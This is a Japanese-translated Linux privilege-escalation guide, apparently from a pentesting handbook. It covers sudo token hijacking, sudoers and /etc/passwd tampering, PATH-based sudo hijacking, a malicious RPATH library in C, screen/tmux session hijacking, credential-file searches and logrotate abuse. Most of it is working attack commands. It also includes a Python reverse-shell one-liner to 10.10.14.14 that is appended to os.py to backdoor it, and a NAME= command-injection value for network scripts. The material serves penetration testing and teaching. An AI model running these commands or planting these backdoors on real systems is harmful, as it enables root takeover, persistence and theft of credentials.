[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限をバイパスするために悪用できる Unix バイナリをまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに対して**引数のみ注入できる**ケース向けの同様のリストです。

このプロジェクトでは、制限されたシェルから抜け出したり、権限を昇格または維持したり、ファイルを転送したり、bind shell や reverse shell を起動したり、その他の post-exploitation タスクを容易にしたりするために悪用できる、Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、sudo rule の exploit 方法が見つかるか確認できます。

### Sudo トークンの再利用

**sudo access** はあるもののパスワードがない場合、**sudo コマンドの実行を待機してからセッション・トークンをハイジャックする**ことで権限を昇格できます。<sup>[[18]](#references)</sup>

権限昇格の要件:

- ユーザー "_sampleuser_" としてすでに shell を取得している
- "_sampleuser_" が**過去 15 分以内に `sudo` を使用している**（デフォルトでは、パスワードを入力せずに `sudo` を使用できる sudo token の有効期間が 15 分）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` にアクセスできる（upload できること）

`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行するか、`/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` に設定することで、`ptrace_scope` を一時的に有効化できます。

これらすべての要件を満たしている場合、**次を使用して権限を昇格できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初の exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` バイナリを作成します。これを使用して**自分のセッションで sudo token を有効化**できます（自動的に root shell が取得されるわけではないため、`sudo su` を実行します）。
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) は、_/tmp_ に **root 所有で setuid が設定された** sh shell を作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3つ目の exploit**（`exploit_v3.sh`）は、**sudoers ファイルを作成し、sudo トークンを永続化して、すべてのユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ内のフォルダまたは作成されたファイルのいずれかに **write permissions** がある場合、binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して、**ユーザーと PID 用の sudo token を作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 の shell を持っている場合、次の操作を行うことで、パスワードを知る必要なく **sudo privileges を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルおよび `/etc/sudoers.d` 内のファイルでは、誰が `sudo` をどのように使用できるかを設定します。これらのファイルは**デフォルトでは root ユーザーと root グループのみが読み取り可能**です。\
**もし**このファイルを**読み取る**ことができれば、**興味深い情報を入手できる**可能性があり、いずれかのファイルに**書き込む**ことができれば、**権限昇格**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みが可能なら、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`など、`sudo`バイナリの代替手段がいくつかあります。`/etc/doas.conf`の設定を確認することを忘れないでください。
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas` で editor または interpreter が許可されている場合は、GTFOBins-style の escape を確認します：
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

**ユーザーが通常マシンに接続し、権限昇格のために `sudo` を使用している**ことを把握しており、そのユーザーコンテキスト内でシェルを取得した場合、**root としてコードを実行してからユーザーのコマンドを実行する新しい sudo executable**を作成できます。次に、ユーザーコンテキストの **$PATH** を変更します（たとえば `.bash_profile` に新しいパスを追加する）ことで、ユーザーが sudo を実行したときに、作成した sudo executable が実行されるようにします。

ユーザーが別の shell（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) に別の例があります。

または、次のようなものを実行します。
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**ライブラリが** **検索**される**他のフォルダ**を示します。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これは、システムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

何らかの理由で、**ユーザーが**次のいずれかのパスに対する**書き込み権限**を持っている場合: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定された任意のフォルダ、そのユーザーは権限を昇格できる可能性があります。\
次のページで、**この設定ミスを悪用する方法**を確認してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
libを`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているため、この場所にあるプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使って `/var/tmp` に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities は、**利用可能な root 権限の一部をプロセスに付与**します。これにより、root の **権限がより小さく独立した単位に分割**されます。これらの各単位は、プロセスに個別に付与できます。この方法により、権限の完全なセットが縮小され、exploit のリスクが低減します。\
以下のページを読んで、**capabilities とその abuse 方法について詳しく学んでください**。


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## ディレクトリの権限

ディレクトリでは、**"execute" ビット**は、対象ユーザーがフォルダに "**cd**" できることを意味します。\
**"read" ビット**はユーザーが **files** を **list** できることを意味し、**"write" ビット**はユーザーが新しい **files** を **delete** および **create** できることを意味します。

## ACLs

Access Control Lists (ACLs) は、任意アクセス権限における第2層を表し、**従来の ugo/rwx 権限を上書き**できます。これらの権限により、所有者ではない、またはグループに属していない特定のユーザーに対して権限を許可または拒否できるため、file またはディレクトリへのアクセスをより細かく制御できます。このレベルの **granularity により、より正確なアクセス管理が可能になります**。詳細については[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。<sup>[[19]](#references)</sup>

user "kali" に file の read および write 権限を**付与**します:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
システムから特定のACLを持つファイルを**取得**:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in における隠し ACL バックドア

よくある設定ミスは、`/etc/sudoers.d/` にあるモード `440` の root 所有ファイルが、ACL によって低権限ユーザーに書き込みアクセスを与えていることです。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` のような記述がある場合、制限的な mode bit にもかかわらず、そのユーザーは sudo rule を追記できます。
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは、`ls -l` のみを使ったレビューでは見落としやすいため、影響の大きい ACL 永続化/権限昇格経路です。

## 開いている shell セッション

**古いバージョン**では、別のユーザー（**root**）の **shell** セッションを**乗っ取る**ことができます。\
**最新バージョン**では、自分のユーザーの screen セッションにのみ**接続**できます。ただし、**セッション内に興味深い情報**が見つかる可能性があります。

### screen セッションの乗っ取り

**screen セッションを一覧表示する**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (some systems expose one as symlink of the other): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux versions** における問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) session を hijack することはできませんでした。

**tmux sessions を一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations (一部のシステムでは、一方がもう一方のシンボリックリンクとして公開される) - tmux sessions hijacking: tmux -S /tmp/dev sess ls そのソケットを使用して一覧表示し、そのソケットで tmux session を開始できます...](<../../images/image (837).png>)

**session に attachする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
HTB の **Valentine box** を例として確認してください。

## SSH

### Debian OpenSSL 予測可能な PRNG - CVE-2008-0166

2006 年 9 月から 2008 年 5 月 13 日までの間に Debian ベースのシステム（Ubuntu、Kubuntu など）で生成されたすべての SSL および SSH key は、このバグの影響を受けている可能性があります。\
このバグは、これらの OS で新しい ssh key を作成する際に、**32,768 通りのバリエーションしか存在しなかった**ことが原因です。つまり、すべての候補を計算でき、**ssh public key があれば対応する private key を検索できます**。計算済みの候補は、こちらで確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key 認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合に、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### ログイン制御ファイル

これらのファイルは、誰がログインできるか、またどのようにログインできるかに影響します。

- **`/etc/nologin`**: 存在する場合、root 以外のログインをブロックし、そのメッセージを表示します。
- **`/etc/securetty`**: root がログインできる場所を制限します（TTY の allowlist）。
- **`/etc/motd`**: ログイン後に表示される banner（環境やメンテナンスの詳細を leak する可能性があります）。

### PermitRootLogin

root が ssh を使用してログインできるかどうかを指定します。デフォルトは `no` です。指定可能な値は次のとおりです。

- `yes`: root はパスワードと private key を使用してログインできます
- `without-password` または `prohibit-password`: root は private key を使用した場合のみログインできます
- `forced-commands-only`: root は private key を使用し、commands options が指定されている場合にのみログインできます
- `no` : 不可

### AuthorizedKeysFile

ユーザー認証に使用できる public key を含むファイルを指定します。ホームディレクトリに置き換えられる `%h` のような token を含めることができます。**絶対パス**（`/` で始まるパス）または **ユーザーのホームディレクトリからの相対パス**を指定できます。例:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
この設定により、ユーザー "**testusername**" の **private** key で login しようとすると、ssh はその key の public key と、`/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にある key を比較します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使用すると、**key をサーバー上に置いたままにせず**（passphrase なしの key も含む）、**ローカルの SSH key を使用**できます。これにより、ssh 経由で **ホストへ jump** し、そこから **初期ホストにある** **key を使用して**別の **ホストへ jump** できます。

この option を `$HOME/.ssh.config` に次のように設定する必要があります。
```
Host example.com
ForwardAgent yes
```
`Host` が毎回 `*` になっている場合、ユーザーが別のマシンに移動するたびに、そのホストから keys にアクセスできるようになります（これは security issue です）。

`/etc/ssh_config` ファイルでこの **options** を **override** し、この設定を許可または拒否できます。\
`/etc/sshd_config` ファイルでは、キーワード `AllowAgentForwarding` を使用して ssh-agent forwarding を **allow** または **denied** にできます（デフォルトは allow）。

環境内で Forward Agent が設定されていることを確認した場合は、以下のページを読んでください。**privileges を escalate するために abuse できる可能性があります**。


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### Profile files

`/etc/profile` ファイルおよび `/etc/profile.d/` 配下のファイルは、**ユーザーが新しい shell を実行したときに実行される scripts** です。そのため、これらのいずれかに **write または modify できる場合、privileges を escalate できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
奇妙なプロファイルスクリプトが見つかった場合は、**機微な情報**がないか確認してください。

### Passwd/Shadow Files

OSによっては、`/etc/passwd`および`/etc/shadow`ファイルの名前が異なる場合や、バックアップが存在する場合があります。そのため、**すべてを見つけ**、ファイルを**読み取れるか確認**して、ファイル内に**ハッシュがあるかどうか**を確認することを推奨します。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が見つかることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー `hacker` を追加し、生成されたパスワードを設定します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使用して `su` コマンドを実行できます。

または、以下の行を使用してパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注: BSDプラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` に配置され、`/etc/shadow` は `/etc/spwd.db` に名前変更されています。

**機密ファイルに書き込み可能か**確認してください。例えば、**サービス設定ファイル**に書き込むことはできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
たとえば、そのマシンで **tomcat** サーバーが稼働しており、**/etc/systemd/ 内の Tomcat service configuration file を変更できる場合、**次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次回 tomcat が起動されたときに、バックドアが実行されます。

### フォルダーを確認

以下のフォルダーには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のフォルダーはおそらく読み取れませんが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分間に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読むと、**パスワードを含んでいる可能性のある複数のファイルを検索している**ことがわかります。\
同様の目的で使用できる**もう1つの興味深いツール**は、[**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは、Windows、Linux、Mac のローカルコンピューターに保存されている多数のパスワードを取得するために使用されるオープンソースアプリケーションです。

### ログ

ログを読み取れる場合、**ログ内から興味深い情報や機密情報を見つけられる**可能性があります。ログの内容が奇妙であるほど、より興味深いものになるでしょう（おそらく）。\
また、設定が「**不適切な**」（バックドアが仕掛けられている？）**audit logs**によっては、この投稿 [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/) で説明されているように、**パスワードを audit logs に記録**できる場合があります。<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを**読むために、グループ** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **が非常に役立ちます。**

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

**password** という単語がファイルの**名前**または**内容**に含まれているファイルも確認し、ログ内のIPやメールアドレス、またはハッシュの正規表現も確認してください。\
これらすべての方法をここで列挙するつもりはありませんが、興味があれば、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認できます。

## Writable files

### Python library hijacking

Python scriptが実行される**場所**を把握しており、そのフォルダー内に**書き込み可能**であるか、**Python librariesを変更**できる場合は、OS libraryを変更してbackdoor化できます（Python scriptが実行される場所に書き込める場合は、os.py libraryをコピーして貼り付けます）。

**libraryをbackdoor化**するには、os.py libraryの末尾に次の行を追加します（IPとPORTを変更してください）。
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリへの **write permissions** を持つユーザーは、特権を昇格できる可能性があります。これは、通常 **root** として実行される `logrotate` を操作して、特に _**/etc/bash_completion.d/**_ のようなディレクトリ内で任意のファイルを実行させられる可能性があるためです。_ /var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリについて、権限を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` version `3.18.0` and older に影響します

この脆弱性の詳細情報は、次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

[**logrotten**](https://github.com/whotwagner/logrotten) を使ってこの脆弱性を exploit できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** と非常によく似ています。そのため、ログを変更できることがわかった場合は、常にそのログを管理しているユーザーを確認し、ログを symlinks に置き換えることで特権を昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

何らかの理由で、ユーザーが _/etc/sysconfig/network-scripts_ に **write** できる `ifcf-<whatever>` script を作成できる、または既存のものを **adjust** できる場合、**system is pwned** です。<sup>[[20]](#references)</sup>

Network scripts、たとえば _ifcg-eth0_ はネットワーク接続に使用されます。これらは .INI ファイルとまったく同じように見えます。しかし Linux では Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらの network scripts 内の `NAME=` attribute は正しく処理されません。名前に **white/blank space** が含まれていると、システムは **white/blank space の後の部分を実行しようとします**。つまり、**最初の blank space より後のすべてが root として実行されます**。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意してください_)

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、**classic Linux service management system** である System V init（SysVinit）用の **scripts** が格納されています。`start`、`stop`、`restart`、場合によっては `reload` によって service を操作できます。これらは直接実行することも、`/etc/rc?.d/` にある symbolic links を介して実行することもできます。Redhat systems における別の path は `/etc/rc.d/init.d` です。

一方、`/etc/init` は **Upstart** に関連付けられています。これは Ubuntu が導入した、より新しい **service management** で、service management tasks に configuration files を使用します。Upstart への移行後も、Upstart の compatibility layer により、SysVinit scripts は Upstart configurations と併用されています。

**systemd** は modern initialization and service manager として登場し、on-demand daemon starting、automount management、system state snapshots などの advanced features を提供します。distribution packages 用の files を `/usr/lib/systemd/` に、administrator modifications 用の files を `/etc/systemd/system/` に整理し、system administration process を効率化します。<sup>[[21]](#references)</sup>

## その他の Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### restricted Shells からの脱出


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般的に、syscall に hook を仕掛けて、userspace manager に privileged kernel functionality を公開します。manager authentication が弱い場合（例：FD-order に基づく signature checks や脆弱な password schemes）、local app が manager になりすまし、すでに root 化された devices 上で root への privilege escalation を実行できる可能性があります。詳細および exploitation の方法はこちらを参照してください:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex-driven service discovery は、process command lines から binary path を抽出し、privileged context で `-v` を付けて実行できます。許容範囲が広い patterns（例：`\S` の使用）は、writable locations（例：`/tmp/httpd`）に attacker が用意した listeners に match する可能性があり、root としての execution につながります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

他の discovery/monitoring stacks に適用可能な generalized pattern の詳細および確認はこちら:


{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors を探すための最適な tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC における kernel vulns を Enumerate [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**追加 scripts の Recopilation**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning（Crontab UI privesc、zip -P creds の再利用）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era：cron-executed monitor 用の forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025：Neighborhood Watch Bypass（sudo env_keep PATH hijack）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Guide](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend：Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [誰も command execution を予期しない！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
